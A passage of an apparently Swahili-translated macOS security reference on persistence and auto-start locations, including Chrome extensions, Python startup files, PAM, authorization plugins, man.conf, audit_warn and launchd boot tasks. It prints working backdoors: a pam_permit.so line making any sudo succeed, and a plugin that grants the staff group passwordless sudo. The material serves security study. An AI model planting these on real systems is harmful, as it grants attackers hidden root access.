Hizi ni njia mbili tofauti za usakinishaji. [Nyaraka za Chrome kuhusu usakinishaji wa nje](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions) zinasema kuwa watumiaji wa **Windows na macOS lazima wathibitishe na kuwasha** extension inayotolewa kupitia faili ya *External Extensions*; haiendeshwi kwa sababu tu faili hiyo ya JSON imeandikwa. Kwa usakinishaji wa watumiaji wote kwenye macOS, Chrome pia huhitaji faili ya external-extension ilindwe dhidi ya marekebisho yasiyo na ruhusa za juu. Policy ya `ExtensionInstallForcelist` au `ExtensionSettings` inayosimamiwa inaweza kusakinisha na kubandika extension bila mtumiaji kuingilia kati; [mwongozo wa Google wa policy za Mac](https://support.google.com/chrome/a/answer/7517624) unaeleza usanidi unaosimamiwa na kusema kuwa mtumiaji hawezi kuondoa extensions zilizowekwa kwa force-install. Hii ni njia ya kusambaza policy, si njia ya mkato ya `defaults write` kwa kila mtumiaji.<sup>[[49]](#references)</sup>

> [!WARNING]
> Kwenye macOS, manifest ya JSON ya *External Extensions* lazima ielekeze kwenye URL ya masasisho ya **Chrome Web Store**, si CRX ya ndani. Usambazaji kwa managed policy una masharti yake ya enterprise na unaweza kuruhusu URL ya masasisho inayosimamiwa na mtu mwenyewe. Kwa extension ya ndani ambayo haijafungashwa kwenye wasifu wa majaribio, switch ya Chrome ya developer mode `--load-extension=/path` ni utaratibu tofauti na haifanyi faili ya JSON ya External Extensions ijitekeleze. Usichukulie kuandika kwenye `Secure Preferences` kuwa sawa na mojawapo ya njia rasmi za usajili.

```bash
# In a disposable browser account, propose a Chrome Web Store extension for enablement
ext_id='replace_with_32_character_web_store_id'
external_dir="$HOME/Library/Application Support/Google/Chrome/External Extensions"
mkdir -p "$external_dir"
cat > "$external_dir/$ext_id.json" <<'JSON'
{ "external_update_url": "https://clients2.google.com/service/update2/crx" }
JSON
```

Anzisha Chrome katika akaunti hiyo ya muda na uangalie kidokezo cha kuwezesha; tabia ya extension yenyewe ndiyo PoC ya utekelezaji baada ya mtumiaji kukubali. Baada ya jaribio, ondoa manifest na uzime/ufute extension katika profile hiyo. Njia hii **haikujaribiwa** katika profile ya Chrome iliyokuwa inatumika kwenye Mac ya utafiti. Njia ya managed-policy pia haikutumika hapo.

Force-install na External Extensions hutumia ID za extension za **Chrome Web Store**; kwa mbinu ya kiwango cha chini ya kuingiza extension ya ndani kimyakimya kwa kuhariri `Secure Preferences` ya profile iliyosainiwa kwa HMAC, na matumizi mabaya mengine ya mchakato wa Chromium, angalia:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md
{{#endref}}

### Vishikizo vya URL Scheme na Aina za Faili (LaunchServices)

Maelezo: [Remote Mac Exploitation Via Custom URL Schemes (Objective-See)](https://objective-see.org/blog/blog_0x38.html)<sup>[[52]](#references)</sup>

- Muhimu kwa bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Kichocheo ni mwathiriwa kubofya kiungo (kwa mfano, katika Chrome/Brave/Safari) au kufungua faili ya aina iliyosajiliwa
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- `Info.plist` ya app bundle inayotangaza **`CFBundleURLTypes`/`CFBundleURLSchemes`** (custom URL scheme) au **`CFBundleDocumentTypes`** (kiendelezi cha faili/UTI)
- Mipangilio chaguomsingi inayotumika kwa kila mtumiaji inaweza kuonekana katika **`~/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist`** (array ya `LSHandlers`). API rasmi ya Apple ya kuchagua chaguomsingi la URL scheme ni `LSSetDefaultHandlerForURLScheme`; kuandika moja kwa moja kwenye plist hiyo si njia iliyorekodiwa ya usajili au kusasisha cache.

#### Maelezo na Unyonyaji

Launch Services hupata madai ya URL scheme na hati kutoka kwa `Info.plist` ya app iliyosajiliwa. [Mwongozo wa usajili wa Apple](https://developer.apple.com/library/archive/documentation/Carbon/Conceptual/LaunchServicesConcepts/LSCTasks/LSCTasks.html) unasema usajili unaweza kufanyika Finder inapogundua app, wakati wa kuwasha au kuingia, au kupitia API ya usajili iliyo wazi; kuweka tu app mahali fulani hakuhakikishi kuwa kichocheo kitatokea mara moja. Baada ya usajili, kufungua URL au hati inayolingana kunaweza kuzindua app iliyochaguliwa kuwa handler, kutegemea chaguo la mtumiaji la handler chaguomsingi na ukaguzi wa kawaida wa uzinduzi wa macOS. API rasmi ya `LSSetDefaultHandlerForURLScheme` hubadilisha handler ya URL inayopendelewa na mtumiaji; haisababishi app mpya iliyowekwa ijitekeleze yenyewe moja kwa moja.<sup>[[52]](#references)</sup>

```bash
# Inspect known handlers without registering an app or changing defaults
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -dump | grep -A3 "scheme:"
```

Hakuna app iliyosajiliwa, wala mapendeleo ya handler yaliyobadilishwa kwenye Mac ya utafiti ya macOS 26.5.2. Ili kujaribu handler halisi, tumia akaunti ya mtumiaji ya muda, sajili app inayoweka alama pekee yenye scheme ya kipekee, iite kupitia URL yake, kisha uondoe app na usajili wake.

Kwa maelezo ya kina kuhusu kuorodhesha/ kutumia vibaya handlers za file-extension na URL-scheme, angalia:

{{#ref}}
macos-security-and-privilege-escalation/macos-file-extension-apps.md
{{#endref}}

### Faili za kuanzisha Python (`.pth` / `usercustomize` / `sitecustomize`)

Maelezo: [https://docs.python.org/3/library/site.html](https://docs.python.org/3/library/site.html)<sup>[[56]](#references)</sup>

- Ni muhimu kwa bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Huendeshwa interpreter husika ya Python inapoanza ikiwa directory hiyo ya site imewashwa; trigger si ya jumla kwa virtual environments, Python builds au startup flags zote
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Huendeshwa kwa privileges/TCC za process yoyote iliyoanzisha interpreter

#### Mahali

- **`$(python3 -m site --user-site)/*.pth`** (macOS framework builds: `~/Library/Python/<X.Y>/lib/python/site-packages/`)
  - Haihitaji root (mtumiaji anaweza kuandika)
  - **Trigger**: interpreter ya Python build hiyo inapoanza huku user site ikiwa imewashwa; module ya `site` huchakata faili za `.pth` zilizo kwenye directories za site zinazotumika
- **`<user-site>/usercustomize.py`**
  - Haihitaji root
  - **Trigger**: interpreter inapoanza huku user site ikiwa imewashwa (huingizwa kiotomatiki na `site`)
- **`<prefix>/site-packages/sitecustomize.py`** (kwa mfano, `/opt/homebrew/lib/python3.13/site-packages/`, au njia za mfumo)
  - Huenda ikahitaji root/admin, kulingana na mahali interpreter ilipo
  - **Trigger**: interpreter inapoanza ikiwa na directory hiyo ya site

#### Maelezo na Exploitation

Wakati wa kuanza, Python kwa kawaida huingiza `site` na kuchanganua directories zake zinazotumika za `site-packages` ili kupata faili za `.pth`. Mbali na kuongeza njia, mstari wa `.pth` unaoanza na `import ` hutekeleza msimbo wa Python hata kama module iliyotajwa haitatumiwa kwa njia nyingine yoyote. Python pia hujaribu kuingiza `sitecustomize` na, **user site ikiwa imewashwa**, `usercustomize`.<sup>[[56]](#references)</sup> Trigger hutokea interpreter inapoanza tena baadaye na kuona directory iliyobadilishwa. `-S` huzima uchakataji wa `site`; `-s`, `-I`, au `PYTHONNOUSERSITE` huzima matoleo ya **user-site**. Kwa kawaida, `-I` haizimi `sitecustomize` ya global. Virtual environments zinaweza pia kuondoa user site. Angalia `python3 -m site` kwa interpreter husika.

PoC ifuatayo iliendeshwa kwenye macOS 26.5.2. `PYTHONUSERBASE` huhamisha user site hadi directory ya muda kwa ajili ya jaribio hili; hakuna user site halisi inayobadilishwa:

```python
import os, pathlib, subprocess, tempfile

with tempfile.TemporaryDirectory(prefix='ht-python-site-') as root:
    env = os.environ.copy()
    env['PYTHONUSERBASE'] = root
    env.pop('PYTHONNOUSERSITE', None)
    user_site = pathlib.Path(subprocess.check_output(
        ['python3', '-m', 'site', '--user-site'], env=env, text=True
    ).strip())
    user_site.mkdir(parents=True)
    pth_marker = pathlib.Path(root) / 'pth.marker'
    user_marker = pathlib.Path(root) / 'user.marker'
    (user_site / 'ht_probe.pth').write_text(
        'import pathlib; pathlib.Path(' + repr(str(pth_marker)) + ').touch()\n'
    )
    (user_site / 'usercustomize.py').write_text(
        'import pathlib; pathlib.Path(' + repr(str(user_marker)) + ').touch()\n'
    )
    subprocess.run(['python3', '-c', 'pass'], env=env, check=True)
    print('pth:', pth_marker.exists(), 'usercustomize:', user_marker.exists())
```

Both markers zilionekana. Kurudia kwa kutumia `-s`, `-I`, au `-S` kulizuia markers zote mbili za **user-site** katika jaribio hili. `sitecustomize` katika global site directory haikujaribiwa.

## Root Sandbox Bypass

> [!TIP]
> Hapa unaweza kupata maeneo ya kuanzia yanayofaa kwa **sandbox bypass**, yanayokuwezesha kutekeleza kitu kwa urahisi kwa **kukandika kwenye faili** ukiwa **root** na/au ukihitaji **masharti mengine yasiyo ya kawaida.**

### Periodic

> [!CAUTION]
> **Utaratibu wa kihistoria:** Kwenye mashine ya majaribio ya macOS 26.5.2, `/usr/sbin/periodic`, `/etc/defaults/periodic.conf`, `/etc/periodic`, na launch daemons za `com.apple.periodic-*` hazipo. Usidhani kwamba kuunda `/etc/periodic` kwenye mfumo wa sasa kutapanga yaliyomo humo yatekelezwe. Kabla ya kutumia mfano ulio hapa chini, hakikisha kwamba amri na scheduler iliyowezeshwa vinapatikana kwenye toleo lengwa.

Maelezo: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- Inafaa kwa sandbox bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - Lakini unahitaji kuwa root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
  - Inahitaji root
  - **Kichochezi**: Wakati utakapofika
- `/etc/daily.local`, `/etc/weekly.local` au `/etc/monthly.local`
  - Inahitaji root
  - **Kichochezi**: Wakati utakapofika

#### Maelezo na Utekelezaji wa Exploit

Katika matoleo ya zamani, scripts za periodic (**`/etc/periodic`**) zilipangwa kuendeshwa na **launch daemons** katika `/System/Library/LaunchDaemons/com.apple.periodic*`. Kuanzia macOS Big Sur 11.5, periodic runner iliendesha scripts katika directories za periodic kama **mmiliki wa kila faili**, na hivyo kufunga njia ya awali ya privilege escalation.<sup>[[27]](#references)</sup> Amri na orodha za directories zilizo hapa chini ni matokeo ya kihistoria, si matokeo ya jaribio la macOS 26.5.2.

```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```

Kuna scripts nyingine za mara kwa mara ambazo zitatekelezwa, kama zilivyoonyeshwa katika **`/etc/defaults/periodic.conf`**:

```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```

Kwenye mifumo ya zamani iliyokuwa na `periodic` na launch daemons zake zilizosakinishwa na kuwezeshwa, `/etc/daily.local`, `/etc/weekly.local`, na `/etc/monthly.local` zilikuwa njia za ziada za utekelezaji. Ukaguzi salama wa kusoma pekee ni:

```bash
test -x /usr/sbin/periodic && ls /System/Library/LaunchDaemons/com.apple.periodic-*.plist
```

> [!WARNING]
> Kanuni inayotegemea mmiliki ilitumika kwa scripts zilizo moja kwa moja kwenye directories za periodic. Wrapper ya kihistoria ya `999.local` ilikuwa ikitumia `/etc/daily.local`, `/etc/weekly.local`, au `/etc/monthly.local` bila ukaguzi huo wa umiliki; scheduler ilipoendeshwa kama root, faili hizi za ndani ziliendeshwa kama root. Tofauti hii na mabadiliko ya Big Sur 11.5 yameandikwa katika [utafiti wa awali](https://theevilbit.github.io/beyond/beyond_0019/). Hakuna mojawapo ya path hizi inayopaswa kudhaniwa kuwa inatumika wakati `periodic` haipo.

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- Husaidia kukwepa sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Lakini unahitaji kuwa root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- Root inahitajika kila wakati

#### Description & Exploitation

Kwa kuwa PAM inalenga zaidi **persistence** na malware kuliko utekelezaji rahisi ndani ya macOS, blogu hii haitatoa maelezo ya kina, **soma writeups ili kuelewa mbinu hii vizuri zaidi**.<sup>[[28]](#references)</sup>

Angalia PAM modules kwa kutumia:

```bash
ls -l /etc/pam.d
```

Mbinu ya persistence/privilege escalation inayotumia vibaya PAM ni rahisi kama kurekebisha module /etc/pam.d/sudo kwa kuongeza mstari huu mwanzoni:

```bash
auth       sufficient     pam_permit.so
```

Kwa hiyo **itaonekana kama** kitu kama hiki:

```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```

Na kwa hiyo, jaribio lolote la kutumia **`sudo` litafaulu**.

> [!CAUTION]
> Kumbuka kwamba saraka hii inalindwa na TCC, kwa hiyo kuna uwezekano mkubwa kwamba mtumiaji ataombwa kutoa ruhusa ya kuifikia.

Mfano mwingine mzuri ni `su`, ambapo unaweza kuona kwamba inawezekana pia kuzipa moduli za PAM vigezo (na unaweza pia kuweka backdoor kwenye faili hii):

```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```

### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- Ni muhimu kwa bypass ya sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Lakini unahitaji kuwa root na kufanya usanidi wa ziada
- TCC bypass: ???

#### Location

- `/Library/Security/SecurityAgentPlugins/`
  - Root inahitajika
  - Pia inahitajika kusanidi authorization database ili itumie plugin

#### Description & Exploitation

Unaweza kuunda authorization plugin ambayo itatekelezwa mtumiaji anapoingia ili kudumisha persistence. Kwa maelezo zaidi kuhusu jinsi ya kuunda mojawapo ya plugin hizi, angalia writeup zilizotangulia (na uwe mwangalifu, plugin iliyoandikwa vibaya inaweza kukufungia nje na utahitaji kusafisha Mac yako ukiwa kwenye recovery mode).<sup>[[29]](#references)[[30]](#references)</sup>

```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
    NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
    system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```

**Hamisha** bundle hadi eneo ambalo itapakiwa:

```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```

Hatimaye ongeza **rule** ili kupakia Plugin:

```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
            <key>class</key>
            <string>evaluate-mechanisms</string>
            <key>mechanisms</key>
            <array>
                <string>CustomAuth:login,privileged</string>
            </array>
        </dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```

**`evaluate-mechanisms`** itauambia mfumo wa authorization kwamba utahitaji **kuita mechanism ya nje kwa ajili ya authorization**. Zaidi ya hayo, **`privileged`** itasababisha itekelezwe na root.

Iwashe kwa kutumia:

```bash
security authorize com.asdf.asdf
```

Na kisha kundi la **staff** linapaswa kuwa na ufikiaji wa sudo (soma `/etc/sudoers` ili kuthibitisha).

### Man.conf

Maelezo: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- Muhimu kwa kukwepa sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Lakini unahitaji kuwa root na mtumiaji lazima atumie man
- Kukwepa TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- **`/private/etc/man.conf`**
  - Root inahitajika
  - **`/private/etc/man.conf`**: Kila mara man inapotumika

#### Maelezo & Exploit

Faili ya usanidi **`/private/etc/man.conf`** huonyesha binary/script ya kutumia unapofungua faili za nyaraka za man. Kwa hivyo njia ya executable inaweza kubadilishwa ili kila mtumiaji anapotumia man kusoma nyaraka fulani, backdoor iendeshwe.<sup>[[31]](#references)</sup>

Kwa mfano, weka katika **`/private/etc/man.conf`**:

```
MANPAGER /tmp/view
```

Kisha unda `/tmp/view` kama:

```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```

### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- Inafaa kwa bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Lakini unahitaji kuwa root na Apache inahitaji kuwa inaendeshwa
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Httpd haina entitlements

#### Mahali

- **`/etc/apache2/httpd.conf`**
  - Root inahitajika
  - Kichocheo: Apache2 inapowashwa

#### Maelezo na Exploit

Unaweza kubainisha katika `/etc/apache2/httpd.conf` ipakie module kwa kuongeza mstari kama huu:<sup>[[32]](#references)</sup>

```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```

Kwa njia hii, module yako iliyokusanywa itapakiwa na Apache. Jambo pekee ni kwamba unahitaji **kuitia sahihi kwa cheti halali cha Apple**, au **kuongeza cheti kipya kinachoaminika** kwenye mfumo na **kuitia sahihi** kwa kutumia cheti hicho.

Kisha, ikihitajika, ili kuhakikisha seva imeanzishwa unaweza kutekeleza:

```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```

Mfano wa msimbo wa Dylb:

```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
     printf("[+] dylib constructor called from %s\n", argv[0]);
     syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```

### Mfumo wa ukaguzi wa BSM

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- Inafaa kwa bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Lakini unahitaji kuwa root, auditd iwe inaendesha na kusababisha warning
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- **`/etc/security/audit_warn`**
  - Inahitaji root
  - **Kichochezi**: auditd inapogundua warning

#### Maelezo na Exploit

Kila auditd inapogundua warning, script **`/etc/security/audit_warn`** **inatekelezwa**. Kwa hivyo unaweza kuongeza payload yako ndani yake.<sup>[[33]](#references)</sup>

```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```

Unaweza kulazimisha onyo kwa kutumia `sudo audit -n`.

### Startup Items

> [!CAUTION] > **Hili limepitwa na wakati, kwa hivyo hakuna kitu kinachopaswa kupatikana katika saraka hizo.**

**StartupItem** ni saraka inayopaswa kuwekwa ndani ya `/Library/StartupItems/` au `/System/Library/StartupItems/`. Baada ya saraka hii kuundwa, lazima iwe na faili mbili mahususi:

1. **rc script**: Shell script inayotekelezwa wakati wa kuwasha.
2. Faili ya **plist**, inayoitwa `StartupParameters.plist`, ambayo ina mipangilio mbalimbali ya usanidi.

Hakikisha kwamba faili za rc script na `StartupParameters.plist` zimewekwa ipasavyo ndani ya saraka ya **StartupItem** ili mchakato wa kuwasha uzitambue na kuzitumia.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Description</key>
        <string>This is a description of this service</string>
    <key>OrderPreference</key>
        <string>None</string> <!--Other req services to execute before this -->
    <key>Provides</key>
    <array>
        <string>superservicename</string> <!--Name of the services provided by this file -->
    </array>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="superservicename"}}

```bash
#!/bin/sh
. /etc/rc.common

StartService(){
    touch /tmp/superservicestarted
}

StopService(){
    rm /tmp/superservicestarted
}

RestartService(){
    echo "Restarting"
}

RunService "$1"
```

{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Siwezi kupata kipengele hiki kwenye macOS yangu, kwa hivyo angalia writeup kwa maelezo zaidi

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

Iliwasilishwa na Apple, **emond** ni utaratuni wa kuweka kumbukumbu unaoonekana kuwa haujatengenezwa kikamilifu au huenda uliachwa, lakini bado unaweza kufikiwa. Ingawa hauna manufaa makubwa kwa msimamizi wa Mac, huduma hii isiyojulikana sana inaweza kutumika kama njia fiche ya persistence kwa watendaji tishio, na huenda isionekane na wasimamizi wengi wa macOS.<sup>[[34]](#references)</sup>

Kwa wanaojua kuwepo kwake, kutambua matumizi yoyote hasidi ya **emond** ni rahisi. LaunchDaemon ya mfumo kwa huduma hii hutafuta scripts za kutekeleza ndani ya saraka moja. Ili kukagua hili, unaweza kutumia amri ifuatayo:

```bash
ls -l /private/var/db/emondClients
```

### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### Mahali

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
  - Inahitaji Root
  - **Kichochezi**: Ukiwa na XQuartz

#### Maelezo na Exploit

XQuartz **haisakinishwi tena kwenye macOS**, kwa hivyo ukitaka maelezo zaidi angalia writeup.<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> Kusakinisha kext ni jambo gumu sana, hata ukiwa root, kiasi kwamba hili halichukuliwi kama mbinu inayotekelezeka ya kukwepa sandbox au persistence isipokuwa uwe na exploit.

#### Mahali

Ili kusakinisha KEXT kama kipengee cha kuanzisha mfumo, inahitaji **kusakinishwa katika mojawapo ya maeneo yafuatayo**:

- `/System/Library/Extensions`
  - Faili za KEXT zilizojengwa ndani ya mfumo wa uendeshaji wa OS X.
- `/Library/Extensions`
  - Faili za KEXT zilizosakinishwa na programu za wahusika wengine

Unaweza kuorodhesha faili za kext zilizopakiwa kwa sasa kwa kutumia:

```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```

Kwa maelezo zaidi kuhusu [**kernel extensions, angalia sehemu hii**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### Mahali

- **`/usr/local/bin/amstoold`**
  - Inahitaji Root

#### Maelezo na Exploitation

Inaonekana `plist` kutoka `/System/Library/LaunchAgents/com.apple.amstoold.plist` ilikuwa ikitumia binary hii huku ikitoa huduma ya XPC... Jambo ni kwamba binary haikuwepo, kwa hivyo ungeweza kuweka kitu hapo na huduma ya XPC ilipoitwa, binary yako ingeendeshwa.<sup>[[35]](#references)</sup>

Siwezi tena kuipata kwenye macOS yangu.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### Mahali

- **`/Library/Preferences/Xsan/.xsanrc`**
  - Inahitaji Root
  - **Kichocheo**: Huduma inapoendeshwa (mara chache)

#### Maelezo na exploit

Inaonekana si jambo la kawaida sana kuendesha script hii, na sikuweza hata kuipata kwenye macOS yangu. Kwa hivyo, ukitaka maelezo zaidi, angalia writeup.<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **Hii haifanyi kazi katika matoleo ya kisasa ya MacOS**

Pia inawezekana kuweka hapa **amri zitakazoendeshwa wakati wa kuwasha mfumo.** Mfano wa script ya kawaida ya rc.common:

```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
    local test

    if [ -z "${NETWORKUP:=}" ]; then
	test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
	if [ "${test}" -gt 0 ]; then
	    NETWORKUP="-YES-"
	else
	    NETWORKUP="-NO-"
	fi
    fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
    local program="$1"
    local pidfile="${PIDFILE:=/var/run/${program}.pid}"
    local     pid=""

    if [ -f "${pidfile}" ]; then
	pid=$(head -1 "${pidfile}")
	if ! kill -0 "${pid}" 2> /dev/null; then
	    echo "Bad pid file $pidfile; deleting."
	    pid=""
	    rm -f "${pidfile}"
	fi
    fi

    if [ -n "${pid}" ]; then
	echo "${pid}"
	return 0
    else
	return 1
    fi
}

#
# Generic action handler
#
RunService ()
{
    case $1 in
      start  ) StartService   ;;
      stop   ) StopService    ;;
      restart) RestartService ;;
      *      ) echo "$0: unknown argument: $1";;
    esac
}
```

### Kazi za Boot za launchd

Maelezo: [https://theevilbit.github.io/beyond/beyond_0034/](https://theevilbit.github.io/beyond/beyond_0034/)<sup>[[40]](#references)</sup>

- Inafaa kwa bypass ya sandbox: [🔴](https://emojipedia.org/large-red-circle) (inahitajika root)
- Root inahitajika, pamoja na **SIP bypass** au ruhusa ya **`kTCCServiceSystemPolicySysAdminFiles`**/Full Disk Access, kutegemea njia

#### Eneo

`launchd` hupachika plist katika sehemu yake ya **`__TEXT,__config`** inayoelezea "boot tasks" za mapema. Skripti/binari kadhaa za marejeo ambazo kwa kawaida **hazipo** na zinaweza kuundwa na mshambuliaji:

- Seti ya SIP-bypass: **`/Library/Apple/usr/libexec/finish_demo_restore`**, **`/private/var/install/shutdown_installer_tasks`**, **`/private/var/install/deferred_install`**
- Seti ya TCC/FDA: **`/etc/rc.server`**, **`/etc/rc.cdrom`**, **`/etc/rc.netboot`** (`rc.netboot` huwa tayari ipo kwenye Sequoia na matoleo mapya zaidi pekee)

#### Maelezo na Unyonyaji

Dump jedwali la tasks lililopachikwa ili kuona faili ambazo `launchd` itaendesha na keys zinazotumika (`Program`, `ProgramArguments`, `PerformAfterUserspaceReboot`, `RequireSuccess`…):

```bash
otool -X -s __TEXT __config /sbin/launchd | awk '{print $2 $3 $4 $5}' | \
  xxd -r -p | hexdump -v -e '1/4 "%08x"' -e '"\n"' | xxd -r -p
```

Kuunda mojawapo ya faili zilizorejelewa (kwa mfano, `/etc/rc.server`) hufanya `launchd` ilitekeleze kwenye kuwasha upya (userspace) kunakofuata. Maingizo yenye manufaa zaidi yanazuiwa na SIP au yanahitaji TCC SysAdminFiles/Full Disk Access, kwa hiyo hii ni mbinu ya kiwango cha root inayochochewa na kuwasha upya.<sup>[[40]](#references)</sup>

### ~~NVRAM (`apple-trusted-trampoline`)~~

Maelezo: [https://theevilbit.github.io/beyond/beyond_0035/](https://theevilbit.github.io/beyond/beyond_0035/)<sup>[[41]](#references)</sup>

